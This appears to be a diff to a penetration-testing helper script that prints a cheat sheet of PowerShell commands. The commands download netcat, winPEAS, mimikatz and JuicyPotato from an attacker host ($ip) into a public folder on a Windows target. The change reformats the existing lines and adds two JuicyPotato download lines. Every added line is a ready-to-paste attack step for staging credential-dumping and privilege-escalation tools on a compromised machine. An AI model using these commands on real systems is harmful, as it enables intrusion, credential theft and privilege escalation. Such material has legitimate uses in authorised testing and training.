@@ -38,13 +38,12 @@ echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Windows Binaries${End} ${Frame}###${End}"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/wget.exe', 'C:\\\Users\\\Public\\\Documents\\\wget.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/nc.exe', 'C:\\\Users\\\Public\\\Documents\\\nc.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/whoami.exe', 'C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/winPEASany.exe', 'C:\\\Users\\\Public\\\Documents\\\winPEASany.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz32.exe', 'C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz64.exe', 'C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/wget.exe','C:\\\Users\\\Public\\\Documents\\\wget.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/whoami.exe','C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/winPEASany.exe','C:\\\Users\\\Public\\\Documents\\\winPEASany.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz32.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz64.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/JuicyPotato32.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato32.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
 echo -e ""
-echo -e ""
-
-
